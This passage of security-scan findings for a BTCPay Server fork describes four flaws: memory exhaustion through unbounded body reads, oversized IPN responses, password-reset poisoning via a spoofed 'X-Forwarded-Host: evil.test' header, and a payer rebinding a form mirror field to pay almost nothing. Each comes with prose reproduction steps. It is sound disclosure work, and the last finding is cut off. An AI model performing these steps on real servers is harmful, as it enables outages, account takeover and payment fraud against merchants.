Nothing bounds the body: Plugins/PluginManager.cs:178 raises Kestrel's MaxRequestBodySize from the 30 MB default to int.MaxValue for every endpoint, and no middleware before UseAuthorization (Startup.cs:338-361) limits request size. Entry points: POST /tokens is [AllowAnonymous] on a controller whose class-level [Authorize] names the Bitpay scheme (BitpayAccessTokenController.cs:14,30); ASP.NET Core's AuthorizationMiddleware (Microsoft.AspNetCore 10.0.x, assumption) authenticates with the combined policy's schemes before it honours IAllowAnonymous, so the handler runs for the anonymous request. POST /invoices with Content-Type application/json plus the two headers is routed by BitpayEndpointSelectorPolicy to BitpayInvoiceController ([Authorize(CanCreateInvoice, Bitpay)]), and GET /rates* reaches BitpayRateController ([Authorize(..., Bitpay)]) through ordinary routing; the later 401 is irrelevant because the allocation has already happened. The [RateLimitsFilter] on POST /tokens is an MVC filter and executes after the authorization middleware, i.e. after the body is in memory.

Cost: for an ASCII body of N bytes the handler holds ~2N bytes in the StringBuilder (UTF-16) plus ~2N for the final string at ToString(), i.e. roughly 2-4x N of managed heap per in-flight request, in addition to N bytes of temp disk from EnableBuffering; bodies above ~1 GB exceed the maximum string length and throw OutOfMemoryException only after that growth. The server retains, rather than streams and discards, everything the client sends, under a cap the project itself raised to 2 GB. The repository's own treatment of the same pattern shows the missing control: PayJoinEndpointController.cs:164-181 refuses to ReadToEndAsync an anonymous body unless Content-Length is present and at most 1,000,000 bytes (411/413). Impact: an anonymous client sending a body sized to the host's memory, or a few concurrent ones, drives the single BTCPay process (serving every tenant's checkout, UI and API) to the container memory limit / OOM killer or process-wide OutOfMemoryException.

## Evidence
1. [BTCPayServer/Plugins/Bitpay/Security/BitpayAuthenticationHandler.cs:70–82](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Security/BitpayAuthenticationHandler.cs#L70-L82)
   CheckBitId calls Request.EnableBuffering() (unbounded FileBufferingReadStream) and StreamReader.ReadToEndAsync() on the whole body into one .NET string before PubKey parsing or signature verification; the only guard, ContentLength != 0, is also passed by chunked bodies (null). No size cap exists.
2. [BTCPayServer/Plugins/Bitpay/Security/BitpayAuthenticationHandler.cs:40–48](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Security/BitpayAuthenticationHandler.cs#L40-L48)
   HandleAuthenticateAsync invokes CheckBitId whenever both x-signature and x-identity headers are non-empty, with arbitrary values; the signature check fails only after the body has been fully materialised.
3. [BTCPayServer/Plugins/PluginManager.cs:177–179](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PluginManager.cs#L177-L179)
   Kestrel MaxRequestBodySize is raised globally from the 30 MB default to int.MaxValue, so a single request may carry ~2 GB to every endpoint including the Bitpay ones.
4. [BTCPayServer/Plugins/Bitpay/Controllers/BitpayAccessTokenController.cs:14–31](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Controllers/BitpayAccessTokenController.cs#L14-L31)
   Class-level [Authorize(AuthenticationSchemes = Bitpay)] with [AllowAnonymous] on POST /tokens: the authorization middleware still authenticates with the Bitpay scheme before honouring AllowAnonymous, so an unauthenticated POST /tokens with the two headers runs CheckBitId and buffers the body; the RateLimitsFilter is an MVC filter that runs afterwards.
5. [BTCPayServer/Plugins/Bitpay/BitpayEndpointSelectorPolicy.cs:44–68](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/BitpayEndpointSelectorPolicy.cs#L44-L68)
   Requests carrying x-identity/x-signature (TryGetBitpayAuth) to POST /invoices (application/json), GET /invoices, /invoices/* and /tokens are routed to the Bitpay-metadata controllers whose [Authorize] names the Bitpay scheme, giving further anonymous entries to CheckBitId; BitpayRateController (/rates*) carries the same scheme through ordinary routing.
6. [BTCPayServer/Hosting/Startup.cs:338–361](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/Startup.cs#L338-L361)
   Middleware order: nothing between UseRouting and UseAuthentication/UseAuthorization imposes a request-size limit, so the authentication handler is the first component to touch the body.
7. [BTCPayServer/Payments/PayJoin/PayJoinEndpointController.cs:164–180](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/PayJoin/PayJoinEndpointController.cs#L164-L180)
   The project's own guard for the same pattern on another anonymous endpoint: Content-Length is required (411) and capped at 1,000,000 bytes (413) before ReadToEndAsync; the BitId handler has no equivalent.

## Impact
Roughly two to four times the request body in managed heap (plus the body on temp disk) per in-flight anonymous request lets a client exhaust the single BTCPay process, denying service to every store, checkout and API consumer on the host until restart or OOM-kill recovery. No confidentiality or integrity impact.

## Reproduction steps
1. Any unauthenticated network client sends POST /tokens (or POST /invoices with Content-Type application/json, or GET /rates) with arbitrary x-identity and x-signature header values and a body of hundreds of MB to ~1 GB (Content-Length or chunked). Routing selects a Bitpay-scheme endpoint, the authorization middleware authenticates with the Bitpay scheme, and CheckBitId reads the whole body into a string before the (failing) signature check. No credentials, interaction or non-default configuration are needed; MaxRequestBodySize is int.MaxValue in every deployment and no earlier middleware limits size. The attacker must actually transmit the bytes (the StringBuilder grows as data arrives), so the attack is bounded by their upload bandwidth, but the server retains 2-4x the received bytes in managed heap per in-flight request rather than streaming them.

## Recommended fix
1. CheckBitId materialises the entire request body as a string for every request presenting BitId headers, before authentication succeeds, with no size limit, so an anonymous client dictates server memory allocation. Fix criteria: Requests presenting BitId headers must not cause allocation proportional to an arbitrary body: enforce a small maximum body size for BitId-authenticated requests (rejecting larger ones with 413 before reading), or hash the body in a streaming fashion with a cap. Verify by sending an unauthenticated POST /tokens with the two headers and a multi-GB body and observing bounded memory and a prompt rejection.
2. The Bitpay endpoints inherit the global Kestrel MaxRequestBodySize of int.MaxValue although legitimate BitId payloads are a few kilobytes. Fix criteria: Bitpay endpoints (/tokens, /invoices, /rates) carry an explicit request-size limit (e.g. RequestSizeLimit) appropriate to their payloads, so oversized bodies are refused before any handler reads them.

---
**Severity:** HIGH
**Status:** Open
**Category:** Resource exhaustion
**CWE:** [CWE-770](https://cwe.mitre.org/data/definitions/770.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257449

---

# Bitpay IPN sender buffers unbounded response bodies from invoice-creator-controlled notificationURL

## Details
BitpayIPNSender.SendNotification (BTCPayServer/Plugins/Bitpay/BitpayIPNSender.cs:213-219) delivers legacy IPNs to the invoice's notificationURL using `_Client.SendAsync(request, cts.Token)`, and NotifyHttp (134-136) only inspects `response.IsSuccessStatusCode`, never the body. That SendAsync overload uses the default HttpCompletionOption.ResponseContentRead, so System.Net.Http reads and buffers the entire response body into memory before returning, bounded only by HttpClient.MaxResponseContentBufferSize. The 'bitpay-ipn' named client (BitpayPlugin.cs:47-52) sets only a User-Agent and the SSRF ConnectCallback (SSRFProtectionExtensions.cs:19-31); MaxResponseContentBufferSize is not set anywhere in the repository, so the .NET default of int.MaxValue (~2 GB) applies. The only time bound is the 1-minute CancellationTokenSource in SendNotification, which caps transfer duration, not size.

Assumption on the .NET 10 BCL (System.Net.Http, net10.0 per Build/Common.csproj): with ResponseContentRead, HttpContent.LoadIntoBufferAsync pre-allocates a MemoryStream sized to the declared Content-Length when one is given (so a single response header commits the allocation before any body byte arrives) and otherwise grows the buffer by doubling as chunked data streams in, up to the max buffer size. The remote server therefore dictates the allocation size.

Who controls the URL: the invoice creator. BitpayInvoiceController.CreateInvoiceCoreRaw (lines 142-144) copies notificationURL, fullNotifications and extendedNotifications verbatim from the POST /invoices body; InvoiceEntity.FillPlaceholdersUri (InvoiceEntity.cs:496-505) accepts any absolute http/https URL and the SSRF guard refuses only private/loopback addresses, so an attacker-operated public host is allowed. Reachable positions: (a) any store owner or BitId-paired legacy client for that store — a self-registered user creates a store, mints a pairing code at /api-tokens (UIStoresTokenController.cs, policy CanManageLegacyAccessTokens, included by CanModifyStoreSettings) and claims it with POST /tokens (BitpayAccessTokenController.cs); the threat model names the store owner as a hostile tenant; (b) an unauthenticated caller against any store whose blob has AnyoneCanInvoice=true (the Pay Button feature, UIPayButtonController.cs:82), either via POST /invoices?storeId=<id> with Content-Type application/json, which BitpayAuthorizationHandler.cs:54-60 authorises, or via the anonymous Pay Button endpoint /api/v1/invoices whose serverIpn form field becomes NotificationURLTemplate with FullNotifications=true (UIPublicPayButtonController.cs:86-87). The anonymous routes are throttled by the publicinvoices zone (4r/min, burst 10, keyed by a forwardable client IP); the store-owner route is not rate limited.

Trigger: with extendedNotifications=true, the subscriber in BitpayIPNSender.StartAsync (lines 259-262) calls Notify for every InvoiceEvent, including InvoiceEvent.Created published by UIInvoiceController.CreateInvoiceCoreRaw (UIInvoiceController.cs:295) right after the invoice is saved, so the oversized fetch happens immediately on creation. With fullNotifications and an expirationTime ~30 s in the future it also fires on Expired. Jobs are queued per invoice id in MultiProcessingQueue (one unbounded channel and Process task per key, BTCPayServer.Common/MultiProcessingQueue.cs:49-68, no global cap), so N invoices created in quick succession produce N concurrent buffers, and NotifyHttp reschedules failed, timed-out or faulted attempts (including a swallowed OutOfMemoryException) up to 6 times at 10-minute intervals.

Impact: the attacker's endpoint answers each IPN with a Content-Length near 2 GB (or streams a multi-hundred-MB chunked body within the 1-minute window). Each in-flight IPN commits up to ~2 GB of large-object-heap memory in the single BTCPay process that serves every tenant's checkout, UI and API. Under a container/cgroup memory limit the kernel OOM-kills the process; without one, concurrent allocations drive the host into swap and make unrelated allocations in the process throw OutOfMemoryException. Retries and the persisted invoice events let the attacker keep the server down. This is the same defect class as the verified finding webhook-sender-unbounded-response-buffering (WebhookSender), which left this sibling as a lead; it differs in the sink (BitpayIPNSender), in the shorter 1-minute timeout, and in also being reachable by an unauthenticated caller when a store has AnyoneCanInvoice enabled.

## Evidence
1. [BTCPayServer/Plugins/Bitpay/BitpayIPNSender.cs:213–218](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/BitpayIPNSender.cs#L213-L218)
   SendNotification POSTs to the invoice's NotificationURL with _Client.SendAsync(request, cts.Token). That overload uses the default HttpCompletionOption.ResponseContentRead, so the response body is fully buffered in memory before SendAsync returns; the only bound is the 1-minute linked CancellationTokenSource, which limits duration, not size. NotifyHttp (134-136) then reads only response.IsSuccessStatusCode and never touches the body, so the buffering serves no purpose.
2. [BTCPayServer/Plugins/Bitpay/BitpayPlugin.cs:47–52](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/BitpayPlugin.cs#L47-L52)
   Registration of the 'bitpay-ipn' named HttpClient: only a User-Agent header and UseSSRFProtection (SSRFProtectionExtensions.cs:19-31, which sets UseProxy=false and a ConnectCallback rejecting private addresses) are configured. No MaxResponseContentBufferSize is set here or anywhere else in the repository, so the .NET default of int.MaxValue applies.
3. [BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs:142–144](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs#L142-L144)
   POST /invoices (Bitpay legacy API) copies notificationURL, fullNotifications and extendedNotifications verbatim from the request body into the InvoiceEntity. InvoiceEntity.FillPlaceholdersUri (InvoiceEntity.cs:496-505) accepts any absolute http/https URL; the SSRF guard only excludes private/loopback destinations, so the attacker's own public host is permitted.
4. [BTCPayServer/Plugins/Bitpay/BitpayIPNSender.cs:228–262](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/BitpayIPNSender.cs#L228-L262)
   The InvoiceEvent subscriber calls Notify for every event when invoice.ExtendedNotifications is set, including InvoiceEvent.Created, which UIInvoiceController.CreateInvoiceCoreRaw publishes at line 295 immediately after saving the invoice. So the oversized fetch fires on creation with no further attacker action; with FullNotifications it also fires on Expired, which the creator can schedule ~30 s out via expirationTime (BitpayInvoiceController.cs:132-137).
5. [BTCPayServer/Plugins/Bitpay/BitpayIPNSender.cs:122–124](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/BitpayIPNSender.cs#L122-L124)
   Jobs are enqueued into MultiProcessingQueue keyed by invoice.Id. MultiProcessingQueue.Enqueue (BTCPayServer.Common/MultiProcessingQueue.cs:49-68) creates one unbounded channel and one Process task per distinct key with no global concurrency cap, so N invoices created in quick succession yield N concurrent in-flight buffers.
6. [BTCPayServer/Plugins/Bitpay/BitpayIPNSender.cs:166–170](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/BitpayIPNSender.cs#L166-L170)
   Non-success responses, timeouts and exceptions (including a caught OutOfMemoryException from the buffer allocation, swallowed by the catch at 150) set reschedule=true, and the job is re-run every 10 minutes up to MaxTry (6), so each invoice repeats the oversized fetch several times without further attacker action.
7. [BTCPayServer/Plugins/Bitpay/Security/BitpayAuthorizationHandler.cs:50–60](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Security/BitpayAuthorizationHandler.cs#L50-L60)
   Policies.CanCreateInvoice succeeds for a BitId-paired SIN against its paired store (any store owner can mint a pairing code at /api-tokens via BitpayPolicies.CanManageLegacyAccessTokens, included by CanModifyStoreSettings, and claim it with POST /tokens), or for an anonymous caller supplying ?storeId= when the store blob has AnyoneCanInvoice (toggled by the Pay Button feature, UIPayButtonController.cs:82). Either position can create invoices with an arbitrary notificationURL.
8. [BTCPayServer/Plugins/PayButton/Controllers/UIPublicPayButtonController.cs:86–87](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PayButton/Controllers/UIPublicPayButtonController.cs#L86-L87)
   Second route to the same sink: the anonymous Pay Button endpoint GET/POST /api/v1/invoices (gated only by AnyoneCanInvoice and the publicinvoices rate zone) sets entity.NotificationURLTemplate = model.ServerIpn from the form field and FullNotifications = true, so the same IPN delivery to an attacker-chosen URL follows on Expired/PaidInFull etc.

## Impact
Attacker-sized allocations (up to ~2 GB per in-flight IPN, one per invoice, no global cap) exhaust the memory of the single BTCPay Server process, which hosts every tenant's checkout, UI, Greenfield API and payment tracking; the result is an OOM-kill under a container memory limit or allocation failures and swap thrashing without one, denying service to all stores until restart. The scheduled 10-minute retries let the attacker repeat the outage from already-created invoices. No confidentiality or integrity impact.

## Reproduction steps
1. Primary position: a store owner or BitId-paired legacy client for a store they control (self-registration is open by default; pairing needs only store ownership, which the threat model treats as a hostile tenant). They POST /invoices with notificationURL pointing at their own public server and extendedNotifications=true (IPN fires on InvoiceEvent.Created), or fullNotifications with a ~30 s expirationTime. Their server answers with a ~2 GB Content-Length or a fast chunked body within the 1-minute window; many invoices multiply the concurrent buffers and each is retried up to six times. Secondary position: anonymous, against any store with AnyoneCanInvoice (Pay Button) enabled, via the Bitpay POST /invoices?storeId= route or the Pay Button serverIpn field, throttled only by the publicinvoices zone keyed on a forwardable client IP. No size cap, streaming read or concurrency bound stands in the way; the attacker needs only an HTTP server they control.

## Recommended fix
1. SendNotification buffers the entire IPN response body (default ResponseContentRead) although NotifyHttp uses only the status code, and the 'bitpay-ipn' HttpClient leaves MaxResponseContentBufferSize at the .NET default of int.MaxValue, so an invoice creator's endpoint dictates how much memory the server allocates per IPN. Fix criteria: The server must not allocate memory proportional to an IPN endpoint's response: after the fix an endpoint returning an arbitrarily large body (declared via Content-Length or streamed chunked) causes at most a small fixed amount of buffering — e.g. the request completes with HttpCompletionOption.ResponseHeadersRead and the body is discarded or capped at a few kilobytes — while the delivery outcome (status code) is still recorded and retried as today. Verify by pointing a notificationURL at a server declaring a multi-GB Content-Length and observing bounded process memory.
2. The 'bitpay-ipn' HttpClient registration configures no explicit response size limit, so any future caller of this client inherits the unbounded default. Fix criteria: The IPN HttpClient enforces an explicit small MaxResponseContentBufferSize (or equivalent read limit) so that oversized responses are rejected without being buffered, independently of how individual call sites issue requests.

---
**Severity:** HIGH
**Status:** Open
**Category:** Resource exhaustion
**CWE:** [CWE-770](https://cwe.mitre.org/data/definitions/770.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257448

---

# Password-reset and invitation emails take their host from attacker-set forwarded headers when BaseUrl is unset

## Details
CallbackGenerator.GetRequestBaseUrl builds the authority of every emailed security link (password reset, user invitation, email confirmation, store invitation) from ServerSettings.BaseUrl and, when that setting is null/empty, falls back to the incoming request's Scheme/Host/PathBase. Startup.cs registers the forwarded-headers middleware with ForwardedHeaders.All and both KnownProxies and KnownIPNetworks cleared, so Request.Host and Request.Scheme are taken from X-Forwarded-Host / X-Forwarded-Proto sent by any peer (and from the raw Host header where the proxy passes it through). The anonymous POST /login/forgot-password therefore produces https://<attacker host>/login/set-password?userId=...&code=<valid reset token>, which the default SRV-PasswordReset rule (installed by DefaultServerEmailRulesMigration) mails to the victim as the 'Update Password' button; a click delivers the token to the attacker, who redeems it on the real host via POST /login/set-password (ResetPasswordAsync) and takes over the account, including server-admin accounts.

Condition under which it holds (outside attacker control): ServerSettings.BaseUrl is empty and server email is configured. BaseUrl is set only by RedirectLoginSuccess on a server admin's UI login/registration, by the admin-only Branding/Maintenance/Monetization pages, and never by a migration or by the anonymous Greenfield first-admin path. It is therefore empty on API-provisioned instances (first admin via POST /api/v1/users, email via PUT /api/v1/server/email), on instances upgraded to a version with the setting whose admins remain signed in with a persistent cookie, and whenever an admin blanks the Base URL field — whose help text ('The preferred link to this server...') does not present it as a security control, and no operator documentation obliges setting it. The 2.4.5 Changelog entry for #7590/#7628 ('Use the configured server Base URL for account, password-reset, and store-invitation links') shows the project treats request-host-derived reset links as a defect; the empty-BaseUrl fallback is the remaining gap. The same mechanism affects ForInvitation/ForEmailConfirmation/StoreInvitationLink, but those are generated from an admin's or the user's own request and are not attacker-poisonable.

Assumption: the forwarded-headers behaviour is that of Microsoft.AspNetCore.HttpOverrides in the net10.0 shared framework (no separate pin in the manifests) — with empty KnownProxies/KnownIPNetworks the middleware applies the last X-Forwarded-* entry from any remote address — and that the deployment's reverse proxy, if any, does not overwrite X-Forwarded-Host (nginx passes client headers through by default; bare `dotnet BTCPayServer.dll` deployments receive them directly).

## Evidence
1. [BTCPayServer/Services/CallbackGenerator.cs:34–44](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/CallbackGenerator.cs#L34-L44)
   GetRequestBaseUrl returns ServerSettings.BaseUrl only when it is non-empty and parseable; otherwise (line 42) it falls back to the current request's Scheme/Host/PathBase, which ForPasswordReset (71-79), ForInvitation, ForEmailConfirmation and StoreInvitationLink embed as the authority of emailed security links.
2. [BTCPayServer/Hosting/Startup.cs:325–332](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/Startup.cs#L325-L332)
   ForwardedHeadersOptions with KnownIPNetworks.Clear(), KnownProxies.Clear() and ForwardedHeaders.All: with both trust lists empty the ASP.NET Core ForwardedHeadersMiddleware skips the known-proxy check, so X-Forwarded-Host and X-Forwarded-Proto sent by any peer rewrite Request.Host and Request.Scheme; no AllowedHosts restriction is configured anywhere in the tree.
3. [BTCPayServer/Controllers/UIAccountController.cs:661–682](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIAccountController.cs#L661-L682)
   Anonymous POST /login/forgot-password looks up the victim by email, requires only that server email is configured (EmailSenderFactory.IsComplete) and the user can log in, then publishes UserEvent.PasswordResetRequested with callbackGenerator.ForPasswordReset(user) — a link whose host is the attacker's forwarded host when BaseUrl is empty. The RateLimitsFilter is keyed on RemoteAddress, itself derived from X-Forwarded-For.
4. [BTCPayServer/Plugins/Emails/Migrations/DefaultServerEmailRulesMigration.cs:14–33](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Emails/Migrations/DefaultServerEmailRulesMigration.cs#L14-L33)
   Startup migration 20251109_defaultserverrules inserts an EmailRules row for ServerMailTriggers.PasswordReset from the plugin's DefaultEmail, so the reset email is sent without any admin having created a rule.
5. [BTCPayServer/Plugins/Emails/HostedServices/UserEventTriggerHostedService.cs:85–91](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Emails/HostedServices/UserEventTriggerHostedService.cs#L85-L91)
   PasswordResetRequested is turned into the SRV-PasswordReset trigger event with the link placed unchanged in the model as {ResetLink}.
6. [BTCPayServer/Plugins/Emails/EmailsPlugin.cs:129–144](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Emails/EmailsPlugin.cs#L129-L144)
   The default PasswordReset rule addresses {User.MailboxAddress} and renders {ResetLink} as the href of the 'Update Password' call-to-action, so the victim receives a BTCPay-branded button pointing at the attacker's host with userId and a valid reset code in the query string.
7. [BTCPayServer/Controllers/UIAccountController.cs:717–740](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIAccountController.cs#L717-L740)
   Anonymous POST /login/set-password accepts email + code + new password and calls userManager.ResetPasswordAsync (line 740); the captured code therefore lets the attacker set the victim's password on the real host.
8. [BTCPayServer.Abstractions/RequestBaseUrl.cs:43–56](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Abstractions/RequestBaseUrl.cs#L43-L56)
   RequestBaseUrl(HttpRequest) copies request.Scheme and request.Host verbatim and ToString() concatenates them, so the forwarded values become the link authority.
9. [BTCPayServer/Controllers/UIAccountController.cs:503–511](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIAccountController.cs#L503-L511)
   Condition: BaseUrl is auto-populated only inside RedirectLoginSuccess when a server admin completes a UI login (or UI registration) while it is empty. It is never set by the anonymous first-admin path POST /api/v1/users, by any startup migration, or for an upgraded instance whose admins keep a persistent Identity cookie (RememberMe → IsPersistent; the Identity.Application cookie keeps ASP.NET's 14-day sliding default), and UIServerController.Branding (752-754, 790-792) stores null when the field is blanked.

## Impact
Capturing the reset code lets the attacker set a new password for the targeted account via POST /login/set-password and log in as that user; targeting a server administrator yields full read/write control over the instance's users, stores, settings, hot-wallet operations and host-management features. No availability impact.

## Reproduction steps
1. Attacker: anonymous, knows the victim's email. Fetches GET /login/forgot-password for the antiforgery token, then POSTs the victim's email with X-Forwarded-Host (and X-Forwarded-Proto) set to a host they control; X-Forwarded-For spoofing defeats the RemoteAddress-keyed 5r/day limit. If ServerSettings.BaseUrl is empty and server email is configured, the victim receives the default 'Update Password' email whose button targets the attacker's host with userId and a valid reset code. The victim must consciously click it (UI:ACTIVE); the attacker then redeems the code on the real host. AT:PRESENT for the BaseUrl-empty deployment state and a proxy that does not overwrite X-Forwarded-Host.

## Recommended fix
1. Emailed security links (password reset, invitation, confirmation, store invitation) derive their authority from the per-request Host/Scheme whenever ServerSettings.BaseUrl is empty. Fix criteria: Security-sensitive emailed links must never be built from the incoming request's Host; when no configured BaseUrl exists the system should refuse to emit the link (surfacing a configuration error to the operator) or require BaseUrl to be set during initial setup, including the Greenfield first-admin path. Verify: with BaseUrl empty, POST /login/forgot-password carrying X-Forwarded-Host: evil.test does not produce an email whose link host is evil.test.
2. The forwarded-headers middleware trusts X-Forwarded-Host/Proto/For from any remote address because KnownProxies and KnownIPNetworks are cleared. Fix criteria: Forwarded headers are honoured only from configured trusted proxy addresses/networks (or X-Forwarded-Host is excluded and an AllowedHosts list is enforced), so a direct client cannot rewrite Request.Host, Request.Scheme or RemoteIpAddress. Verify: a request from an unlisted peer with X-Forwarded-Host set leaves Request.Host unchanged.

---
**Severity:** HIGH
**Status:** Open
**Category:** Password reset poisoning
**CWE:** [CWE-640](https://cwe.mitre.org/data/definitions/640.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257446

---

# Payer can rebind a form 'mirror' field's source, bypassing server-derived invoice amount

## Details
The Forms plugin offers a 'mirror' field type whose `value` is the full name of another field; at submission the server copies that field's value (optionally mapped through `valuemap`) into the mirror. The editor advertises this for the special names `invoice_amount` / `invoice_amount_adjustment*`: e.g. a payer-visible `select product` (options a/b, validated against the option list by HtmlSelectFormProvider) plus a hidden mirror `invoice_amount` with `value: "product"` and `valuemap {a: "10", b: "20"}` yields a fixed price per product that the payer cannot type in.

The standalone public form path does not protect the pointer. `UIFormsController.SubmitForm` (anonymous, `/forms/{formId}`) calls `Form.ApplyValuesFromForm(Request.Form)` which, for every named non-Constant field regardless of type, sets `Field.Value` from the posted form (Form.cs:98-101). A mirror field is not Constant (the editor hides the Constant and Required checkboxes for mirrors, Modify.cshtml:119-127), so posting `invoice_amount=<anyOtherFieldName>` overwrites the configured pointer. `FieldValueMirror.Validate` only checks that the named field exists. `GenerateInvoiceParametersFromForm` then resolves the mirror against the payer-chosen field:
- with a valuemap, pointing it at e.g. `buyerEmail` returns null -> `Amount = null` -> `CreateInvoiceCoreRaw` creates a TopUp invoice (Price 0, exempt from the zero-amount guard); InvoiceWatcher marks it paid on any payment (1 sat) and records the paid amount as the price, while metadata still says `product: a`;
- without a valuemap, pointing it at a payer-controlled text field yields an arbitrary amount (e.g. 0.01);
- for `invoice_amount_adjustment*` mirrors (shipping/option surcharges) the same trick removes the surcharge or makes it negative.

The maintainers clearly intended mirrors to be server-resolved: `FieldValueMirror.SetValue` is a no-op and the PoS/Crowdfund paths re-parse the config and go through `FormDataService.SetValues`, which discards any payer value for a mirror, so those apps are not affected. Only the standalone form (and, for metadata only, the payment-request form) applies raw `Request.Form` to mirror fields.

Attack: anonymous payer loads the public form, submits the normal fields plus one extra parameter named after the mirror, pays whatever they like, and the merchant sees a Paid invoice for the selected product. Requires a store to have published a form that derives an amount/adjustment via a mirror (AT:PRESENT); no credentials or victim interaction.

## Evidence
1. [BTCPayServer.Abstractions/Form/Form.cs:93–103](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Abstractions/Form/Form.cs#L93-L103)
   ApplyValuesFromForm copies any posted value into Field.Value for every named field that is not Constant, without regard to the field type. For a 'mirror' field, Field.Value is not payer data but the configuration pointer naming which other field to copy from, so the payer can repoint the mirror by posting a parameter with the mirror's name.
2. [BTCPayServer/Plugins/Forms/UIFormsController.cs:194–208](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Forms/UIFormsController.cs#L194-L208)
   Anonymous POST /forms/{formId} (Public form): the stored config is parsed, Request.Form is applied directly via ApplyValuesFromForm (so a posted parameter named after the mirror overwrites its pointer), FormComponentProviders.Validate runs, and the GenerateInvoiceParametersFromForm result goes straight to CreateInvoiceCoreRaw. Unlike PoS/Crowdfund (UIPointOfSaleController.cs:352-353, UICrowdfundController.cs:168-169), which re-parse the config and apply payer data through FormDataService.SetValues (FieldValueMirror.SetValue is a no-op), nothing here discards the payer's mirror pointer.
